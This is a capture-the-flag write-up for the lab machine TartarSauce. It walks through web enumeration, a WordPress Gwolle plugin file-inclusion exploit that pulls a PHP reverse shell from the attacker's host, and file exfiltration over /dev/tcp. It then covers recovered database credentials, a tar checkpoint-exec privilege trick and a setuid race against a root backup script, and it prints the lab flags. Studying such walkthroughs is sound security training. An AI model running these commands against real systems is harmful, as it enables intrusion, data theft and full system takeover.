# CTF Writeup: TartarSauce

## Lab Description

TartarSauce is a fairly challenging box that highlights the importance of a broad remote enumeration instead of focusing on obvious but potentially less fruitful attack vectors. It features a quite realistic privilege escalation requiring abuses of the tar command. Attention to detail when reviewing tool output is beneficial when attempting this machine. 

---

## Reconaissance


An initial scan revealed the following services up and running on the target server.


```
nmap -A -p- --min-rate 10000 10.129.1.185 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 20:14 EDT
Nmap scan report for 10.129.1.185
Host is up (0.021s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 2 hops

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   20.41 ms 10.10.14.1
2   20.56 ms 10.129.1.185

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.95 seconds
```

Since the only attack vector is http, we will immediatly proceed with the enumeration process.
In the scan we can see an exposed /webservices directory, an service called "monstra-3.0.4"
& an /phpmyadmin panel.

Let's map an domain called "tartarsauce.htb" to the provided target ip in our local dns file /etc/hosts.

```
sudo echo "10.129.1.185 tartarsauce.htb" | sudo tee -a /etc/hosts
```

Running dirsearch on tartarsauce.htb provides us with an /robots.txt

The robots.txt file provides us with the following endpoints:

```
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

Let's enumerate further on the domain.

Running feroxbuster on the domain, provided with the information abt wordpress running on the target.

```
feroxbuster -u http://tartarsauce.htb
                                                                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://tartarsauce.htb/
 🚩  In-Scope Url          │ tartarsauce.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w      305c http://tartarsauce.htb/webservices/tar/tar/source
404      GET        9l       32w      301c http://tartarsauce.htb/webservices/phpmyadmin
404      GET        9l       32w      304c http://tartarsauce.htb/webservices/developmental
404      GET        9l       32w      309c http://tartarsauce.htb/webservices/easy-file-uploader
404      GET        9l       32w      299c http://tartarsauce.htb/webservices/tar/tar/
301      GET        9l       28w      338c http://tartarsauce.htb/webservices/monstra-3.0.4 => http://tartarsauce.htb/webservices/monstra-3.0.4/                                                                                
404      GET        9l       32w      295c http://tartarsauce.htb/webservices/tar/
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      563l      128w    10766c http://tartarsauce.htb/
301      GET        9l       28w      324c http://tartarsauce.htb/webservices => http://tartarsauce.htb/webservices/
404      GET        9l       33w      291c http://tartarsauce.htb/Reports%20List
404      GET        9l       33w      293c http://tartarsauce.htb/external%20files
404      GET        9l       33w      303c http://tartarsauce.htb/webservices/Reports%20List
404      GET        9l       33w      305c http://tartarsauce.htb/webservices/external%20files
404      GET        9l       33w      292c http://tartarsauce.htb/Style%20Library
301      GET        9l       28w      327c http://tartarsauce.htb/webservices/wp => http://tartarsauce.htb/webservices/wp/
404      GET        9l       33w      304c http://tartarsauce.htb/webservices/Style%20Library
404      GET        9l       34w      294c http://tartarsauce.htb/neuf%20giga%20photo
404      GET        9l       34w      306c http://tartarsauce.htb/webservices/neuf%20giga%20photo
404      GET        9l       33w      293c http://tartarsauce.htb/Web%20References
301      GET        9l       28w      338c http://tartarsauce.htb/webservices/wp/wp-content => http://tartarsauce.htb/webservices/wp/wp-content/
301      GET        9l       28w      339c http://tartarsauce.htb/webservices/wp/wp-includes => http://tartarsauce.htb/webservices/wp/wp-includes/
301      GET        9l       28w      346c http://tartarsauce.htb/webservices/wp/wp-includes/images => http://tartarsauce.htb/webservices/wp/wp-includes/images/
301      GET        9l       28w      342c http://tartarsauce.htb/webservices/wp/wp-includes/js => http://tartarsauce.htb/webservices/wp/wp-includes/js/
301      GET        9l       28w      336c http://tartarsauce.htb/webservices/wp/wp-admin => http://tartarsauce.htb/webservices/wp/wp-admin/
301      GET        9l       28w      346c http://tartarsauce.htb/webservices/wp/wp-content/plugins => http://tartarsauce.htb/webservices/wp/wp-content/plugins/
301      GET        9l       28w      346c http://tartarsauce.htb/webservices/wp/wp-content/uploads => http://tartarsauce.htb/webservices/wp/wp-content/uploads/
301      GET        9l       28w      345c http://tartarsauce.htb/webservices/wp/wp-includes/fonts => http://tartarsauce.htb/webservices/wp/wp-includes/fonts/
301      GET        9l       28w      346c http://tartarsauce.htb/webservices/wp/wp-content/upgrade => http://tartarsauce.htb/webservices/wp/wp-content/upgrade/
301      GET        9l       28w      349c http://tartarsauce.htb/webservices/wp/wp-includes/customize => http://tartarsauce.htb/webservices/wp/wp-includes/customize/
404      GET        9l       33w      305c http://tartarsauce.htb/webservices/Web%20References
301      GET        9l       28w      347c http://tartarsauce.htb/webservices/wp/wp-includes/widgets => http://tartarsauce.htb/webservices/wp/wp-includes/widgets/
301      GET        9l       28w      343c http://tartarsauce.htb/webservices/wp/wp-includes/css => http://tartarsauce.htb/webservices/wp/wp-includes/css/
404      GET        9l       33w      301c http://tartarsauce.htb/webservices/My%20Project
301      GET        9l       28w      345c http://tartarsauce.htb/webservices/wp/wp-admin/includes => http://tartarsauce.htb/webservices/wp/wp-admin/includes/
301      GET        9l       28w      343c http://tartarsauce.htb/webservices/wp/wp-admin/images => http://tartarsauce.htb/webservices/wp/wp-admin/images/
301      GET        9l       28w      340c http://tartarsauce.htb/webservices/wp/wp-admin/css => http://tartarsauce.htb/webservices/wp/wp-admin/css/
301      GET        9l       28w      339c http://tartarsauce.htb/webservices/wp/wp-admin/js => http://tartarsauce.htb/webservices/wp/wp-admin/js/
301      GET        9l       28w      341c http://tartarsauce.htb/webservices/wp/wp-admin/user => http://tartarsauce.htb/webservices/wp/wp-admin/user/
404      GET        9l       33w      307c http://tartarsauce.htb/webservices/wp/Style%20Library
404      GET        9l       33w      289c http://tartarsauce.htb/Contact%20Us
404      GET        9l       33w      318c http://tartarsauce.htb/webservices/wp/wp-includes/Reports%20List
301      GET        9l       28w      345c http://tartarsauce.htb/webservices/wp/wp-content/themes => http://tartarsauce.htb/webservices/wp/wp-content/themes/
404      GET        9l       33w      320c http://tartarsauce.htb/webservices/wp/wp-includes/external%20files
404      GET        9l       33w      318c http://tartarsauce.htb/webservices/wp/wp-content/Style%20Library
301      GET        9l       28w      352c http://tartarsauce.htb/webservices/wp/wp-includes/certificates => http://tartarsauce.htb/webservices/wp/wp-includes/certificates/
404      GET        9l       34w      309c http://tartarsauce.htb/webservices/wp/neuf%20giga%20photo
301      GET        9l       28w      344c http://tartarsauce.htb/webservices/wp/wp-admin/network => http://tartarsauce.htb/webservices/wp/wp-admin/network/
404      GET        9l       33w      319c http://tartarsauce.htb/webservices/wp/wp-includes/Style%20Library
301      GET        9l       28w      342c http://tartarsauce.htb/webservices/wp/wp-admin/maint => http://tartarsauce.htb/webservices/wp/wp-admin/maint/
404      GET        9l       34w      320c http://tartarsauce.htb/webservices/wp/wp-content/neuf%20giga%20photo
404      GET        9l       33w      290c http://tartarsauce.htb/Donate%20Cash
404      GET        9l       33w      288c http://tartarsauce.htb/Home%20Page
404      GET        9l       33w      293c http://tartarsauce.htb/Planned%20Giving
404      GET        9l       33w      293c http://tartarsauce.htb/Privacy%20Policy
404      GET        9l       33w      287c http://tartarsauce.htb/Site%20Map
404      GET        9l       33w      315c http://tartarsauce.htb/webservices/wp/wp-admin/Reports%20List
404      GET        9l       33w      317c http://tartarsauce.htb/webservices/wp/wp-admin/external%20files
404      GET        9l       33w      302c http://tartarsauce.htb/webservices/Donate%20Cash
404      GET        9l       33w      305c http://tartarsauce.htb/webservices/Planned%20Giving
404      GET        9l       33w      305c http://tartarsauce.htb/webservices/Press%20Releases
404      GET        9l       33w      305c http://tartarsauce.htb/webservices/Privacy%20Policy
404      GET        9l       33w      299c http://tartarsauce.htb/webservices/Site%20Map
301      GET        9l       28w      344c http://tartarsauce.htb/webservices/wp/wp-includes/Text => http://tartarsauce.htb/webservices/wp/wp-includes/Text/
404      GET        9l       33w      316c http://tartarsauce.htb/webservices/wp/wp-includes/modern%20mom
404      GET        9l       34w      321c http://tartarsauce.htb/webservices/wp/wp-includes/neuf%20giga%20photo
404      GET        9l       33w      316c http://tartarsauce.htb/webservices/wp/wp-admin/Style%20Library
404      GET        9l       33w      319c http://tartarsauce.htb/webservices/wp/wp-content/Web%20References
404      GET        9l       33w      313c http://tartarsauce.htb/webservices/wp/wp-admin/modern%20mom
404      GET        9l       34w      318c http://tartarsauce.htb/webservices/wp/wp-admin/neuf%20giga%20photo
404      GET        9l       33w      289c http://tartarsauce.htb/New%20Folder
404      GET        9l       33w      302c http://tartarsauce.htb/webservices/Site%20Assets
404      GET        9l       33w      320c http://tartarsauce.htb/webservices/wp/wp-includes/Web%20References
404      GET        9l       33w      317c http://tartarsauce.htb/webservices/wp/wp-admin/Web%20References
404      GET        9l       33w      305c http://tartarsauce.htb/webservices/wp/Donate%20Cash
404      GET        9l       33w      303c http://tartarsauce.htb/webservices/wp/Home%20Page
404      GET        9l       33w      302c http://tartarsauce.htb/webservices/wp/Site%20Map
404      GET        9l       33w      313c http://tartarsauce.htb/webservices/wp/wp-admin/My%20Project
404      GET        9l       33w      313c http://tartarsauce.htb/webservices/wp/wp-content/Site%20Map
404      GET        9l       33w      315c http://tartarsauce.htb/webservices/wp/wp-includes/Home%20Page
404      GET        9l       33w      305c http://tartarsauce.htb/webservices/wp/Site%20Assets
404      GET        9l       33w      320c http://tartarsauce.htb/webservices/wp/wp-includes/Planned%20Giving
404      GET        9l       33w      320c http://tartarsauce.htb/webservices/wp/wp-includes/Press%20Releases
404      GET        9l       33w      320c http://tartarsauce.htb/webservices/wp/wp-includes/Privacy%20Policy
404      GET        9l       33w      314c http://tartarsauce.htb/webservices/wp/wp-includes/Site%20Map
404      GET        9l       33w      314c http://tartarsauce.htb/webservices/wp/wp-admin/Donate%20Cash
404      GET        9l       33w      316c http://tartarsauce.htb/webservices/wp/wp-content/Site%20Assets
404      GET        9l       33w      312c http://tartarsauce.htb/webservices/wp/wp-admin/Home%20Page
404      GET        9l       33w      317c http://tartarsauce.htb/webservices/wp/wp-admin/Planned%20Giving
404      GET        9l       33w      317c http://tartarsauce.htb/webservices/wp/wp-admin/Privacy%20Policy
404      GET        9l       33w      317c http://tartarsauce.htb/webservices/wp/wp-admin/Press%20Releases
404      GET        9l       33w      311c http://tartarsauce.htb/webservices/wp/wp-admin/Site%20Map
404      GET        9l       33w      317c http://tartarsauce.htb/webservices/wp/wp-includes/Site%20Assets
404      GET        9l       33w      315c http://tartarsauce.htb/webservices/wp/wp-admin/Bequest%20Gift
404      GET        9l       34w      319c http://tartarsauce.htb/webservices/wp/wp-admin/Life%20Income%20Gift
404      GET        9l       33w      313c http://tartarsauce.htb/webservices/wp/wp-admin/New%20Folder
404      GET        9l       34w      314c http://tartarsauce.htb/webservices/wp/wp-admin/What%20is%20New
[####################] - 41s   180055/180055  0s      found:96      errors:125    
[####################] - 34s    30000/30000   885/s   http://tartarsauce.htb/ 
[####################] - 35s    30000/30000   864/s   http://tartarsauce.htb/webservices/ 
[####################] - 37s    30000/30000   810/s   http://tartarsauce.htb/webservices/wp/ 
[####################] - 32s    30000/30000   939/s   http://tartarsauce.htb/webservices/wp/wp-admin/ 
[####################] - 30s    30000/30000   987/s   http://tartarsauce.htb/webservices/wp/wp-content/ 
[####################] - 31s    30000/30000   957/s   http://tartarsauce.htb/webservices/wp/wp-includes/ 
```

Decided to run wpscan on the discovered wordpress endpoint

```
wpscan --url http://tartarsauce.htb/webservices/wp/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://tartarsauce.htb/webservices/wp/ [10.129.1.185]
[+] Started: Fri Oct 24 20:24:51 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tartarsauce.htb/webservices/wp/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tartarsauce.htb/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tartarsauce.htb/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://tartarsauce.htb/webservices/wp/index.php/feed/, <generator>https://wordpress.org/?v=4.9.4</generator>
 |  - http://tartarsauce.htb/webservices/wp/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.4</generator>

[+] WordPress theme in use: voce
 | Location: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/
 | Latest Version: 1.1.0 (up to date)
 | Last Updated: 2017-09-01T00:00:00.000Z
 | Readme: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/readme.txt
 | Style URL: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/style.css?ver=4.9.4
 | Style Name: voce
 | Style URI: http://limbenjamin.com/pages/voce-wp.html
 | Description: voce is a minimal theme, suitable for text heavy articles. The front page features a list of recent ...
 | Author: Benjamin Lim
 | Author URI: https://limbenjamin.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/style.css?ver=4.9.4, Match: 'Version: 1.1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:39 <=================================> (137 / 137) 100.00% Time: 00:00:39

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Oct 24 20:25:35 2025
[+] Requests Done: 170
[+] Cached Requests: 5
[+] Data Sent: 47.953 KB
[+] Data Received: 119.434 KB
[+] Memory used: 265.531 MB
[+] Elapsed time: 00:00:43
```

Enumerated all plugins, even though they might not be detected as vulnerable.

```
nmap -T4 -Pn -sC --script http-wordpress-enum --script-args http-wordpress-enum.root="/webservices/wp/",http-wordpress-enum.search-limit="all",http-wordpress-enum.check-latest="true" -p 80 tartarsauce.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 21:19 EDT
Nmap scan report for tartarsauce.htb (10.129.1.185)
Host is up (0.017s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 4778 themes/plugins
|   plugins
|     akismet 4.0.3 (latest version:5.5)
|     gwolle-gb 2.3.10 (latest version:4.9.3)
|     brute-force-login-protection 1.5.3
|   themes
|     twentyfifteen 1.9
|     twentysixteen 1.4
|     twentyseventeen 1.4
|_    voce 1.1.0

Nmap done: 1 IP address (1 host up) scanned in 328.10 seconds
```

## Vulnerability Assessment

Checking for CVE's

```
searchsploit gwolle                                              
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion               | php/webapps/38861.txt
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Downloaded PoC locally

```
locate php/webapps/38861.txt
/usr/share/exploitdb/exploits/php/webapps/38861.txt
```

Copied exploit in current directory.

```
cp /usr/share/exploitdb/exploits/php/webapps/38861.txt .
```

## Initial Access


The exploit itself is being described that an remote attacker can include an file name "wp-load.php" and execute it's content on the server on the following URL:

```
http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.186/wp-load.php

```

So we can get an php rev shell and name it to wp-load.php and execute it, this should provide us with an shell on the server.

```
locate php-reverse-shell.php
```


```
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Modify the target ip and port to your needs.

```
mv php-reverse-shell.php wp-load.php
```

Start up an listener on your specified port, in my case it's 1337

```
nc -lvnp 1337
```

Start up python web server in the directory, in which u stored the reverse shell script "wp-load.php"

```
python3 -m http.server 80
```

Now visit the PoC URL and prompt your local machine ip with http://<local_machine_ip> in, you don't need to specify the wp-load.php file since it will load by itself.

```
python3 -m http.server 80                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.1.185 - - [24/Oct/2025 21:55:47] code 404, message File not found
10.129.1.185 - - [24/Oct/2025 21:55:47] "GET /wp-load.phpwp-load.php HTTP/1.0" 404 -
10.129.1.185 - - [24/Oct/2025 21:57:27] "GET /wp-load.php HTTP/1.0" 200 -
```
```
nc -lvnp 1337                                                     
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.1.185] 45492
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 21:57:28 up  1:44,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```


Users on the target server

```
www-data@TartarSauce:/$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
onuma:x:1000:1000:,,,:/home/onuma:/bin/bash
```

Searching up for files owned by onuma

```
www-data@TartarSauce:/$ find / -user onuma 2>/dev/null
find / -user onuma 2>/dev/null
/var/backups/onuma-www-dev.bak
/home/onuma
```

Let's inspect the onuma-www-dev.bak file, maybe we can find some credentials inside it.

Downloaded the file on to my local machine.

On my local machine

```
nc -lvnp 8888 > onuma-www-dev.bak        
listening on [any] 8888 ...
```

On the target server

```
cat /var/backups/onuma-www-dev.bak > /dev/tcp/10.10.14.186/8888
```

Unzipped file with tar command and gained information about an wp directory in /tmp.

Enumerated further and gained sql database credentials wpuser:w0rdpr3$$d@t@b@$3@cc3$$
in /tmp/var/www/html/webservices/wp/wp-config.php

Logged into database as "wpuser".

```
www-data@TartarSauce:/tmp/var/www/html/webservices/wp$ mysql -u wpuser -p
mysql -u wpuser -p
Enter password: w0rdpr3$$d@t@b@$3@cc3$$

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 120
Server version: 5.7.22-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Used the following commands in order to retrieve encoded passwords of user "wpadmin"


```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wp                 |
+--------------------+
2 rows in set (0.01 sec)

mysql> use wp
use wp
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_wp          |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_gwolle_gb_entries  |
| wp_gwolle_gb_log      |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
14 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | wpadmin    | $P$BBU0yjydBz9THONExe2kPEsvtjStGe1 | wpadmin       | wpadmin@test.local |          | 2018-02-09 20:49:26 |                     |           0 | wpadmin      |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

mysql>
```

wpadmin:$P$BBU0yjydBz9THONExe2kPEsvtjStGe1

Let's save the encoded password locally and bruteforce an password utilizing john the ripper.

This didn't work I fell into an rabbithole.

Running sudo -l provides us with the information that we are able to run the /tar binary with onuma rights, without authentication needed. Searched up the PoC for tar binary on gtfobins.github.io

```
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Performed lateral movement to onuma user.

Retrieved user.txt in /home/onuma directory.

```
ae833dd58fa8df680c746138dc151eb2
```


Enumerated an .mysql_history file in onuma's home directory asw.

```
onuma@TartarSauce:~$ cat .mysql_history
cat .mysql_history
_HiStOrY_V2_
create\040database\040backuperer;
exit
```

I'm assuming the first string is the mysql password for user onuma.

```
onuma@TartarSauce:~$ mysql -u onuma -p 
mysql -u onuma -p
Enter password: _HiStOrY_V2_

ERROR 1045 (28000): Access denied for user 'onuma'@'localhost' (using password: YES)
```

Access is denied, because mysql is listening only on localhost, but it is confirmed that the password is correct!

Searching the whole Filesystem for files which are collerated to backuperer

```
onuma@TartarSauce:~$ grep -ilr backuperer / 2>/dev/null
grep -ilr backuperer / 2>/dev/null
/proc/6558/task/6558/cmdline
/proc/6558/cmdline
/lib/systemd/system/backuperer.service
/lib/systemd/system/backuperer.timer
/var/backups/onuma_backup_test.txt
/home/onuma/.mysql_history
/usr/sbin/backuperer
```

/usr/sbin/backuperer looks interesting, it's an bash script let's analyze it!


A static analysis of /usr/sbin/backuperer (Appendix A) , reveals that /var/www/html/ is backed up
to /var/tmp/, and subsequently extracted to “/var/tmp/check/var/www/html/”. If this folder exists
and its contents are not the same as “/var/www/html”, the extracted files are not immediately
deleted. There is a window of opportunity to replace this backup with a malicious version and
have a setuid binary extracted. The 32-bit setuid binary and tar archive are created

Using the following binary on my local machine

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(void) {
    setreuid(0, 0);
    system("/bin/sh");
}

```
```
gcc -m32 setuid.c -o setuid

```

Created /var/www/html in my local machine
copy pasted setuid binary in there and compressed it.

```
tar -zcvf exp.tar.gz var 
var/
var/www/
var/www/html/
var/www/html/setuid
```

Downloaded binary from my local machine to the target utilizing netcat.

on target server
```
curl -o exp.tar.gz http://10.10.14.186/exp.tar.gz
```

on local machine

```
python3 -m http.server 80
```

Check when the script executes

```
systemctl list-timers
```

Every 5min's an tmp file get's created copy paste the tar content inside it, after 30s it will be extracted through root and should create /var/www/html/setuid binary 

```
cp exp.tar.gz .<matching_tempfile>
```


Execute the binary 


Now I just need to wait for the automated script to extract our SUID Binary as root so we get an root SUID Binary, which we can utilize to get root shell.


```
cd /var/tmp/check/var/www/html
onuma@TartarSauce:/var/tmp/check/var/www/html$ ./setuid
./setuid
# whoami
whoami
root
```

Retrieve root.txt in /root directory.

```
7a17ac5260e76686782541daaebac087
```
